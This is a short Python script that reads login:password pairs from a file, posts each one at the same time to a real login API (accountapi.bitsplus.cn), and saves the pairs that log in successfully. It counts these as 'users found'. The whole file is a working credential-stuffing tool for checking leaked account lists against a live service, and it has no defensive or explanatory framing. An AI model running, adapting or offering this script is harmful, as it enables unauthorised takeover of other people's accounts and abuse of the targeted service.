
#pip install aiohttp
#pip install cchardet
#pip install aiodns

import asyncio
import aiohttp
import time

async def send_request(session, url, data):
    async with session.post(url=url, data=data) as response:
        result = await response.json()
        return (result, data)

async def test():
    start_time = time.time()

    with open("output.txt", "w") as output_file:
        output_file.truncate()

    with open('input.txt') as input_file:
        lines = [line.rstrip() for line in input_file if len(line) > 1] #[0:10]

    async with aiohttp.ClientSession() as session:
        tasks = []
        for line in lines:
            login = line.split(':')[0]
            password = line.split(':')[1]
            print(login, password)
            data = {
                'mail': f'{login}',
                'passwd': f'{password}',
                'sign': '4bcb3f3cfce02ba293ef98fda67b8683a3d3678637c04ea620f52508b6cf94c0'
            }
            #print(data)
            url = 'https://accountapi.bitsplus.cn/user/login'
            tasks.append(asyncio.ensure_future(send_request(session, url, data)))

        results = await asyncio.gather(*tasks)

        users_found: int = 0
        for result in results:
            response = result[0]
            request = result[1]
            if 'user_id' in str(response):
                users_found += 1
                user_id = response['data']['user_id']
                login = request['mail']
                password = request['passwd']
                with open("output.txt", "a") as output_file:
                    output_file.write(f'{user_id} {login} {password}\n')

    print("\n--- %s seconds ---" % (time.time() - start_time))
    print(f'users found: {users_found}')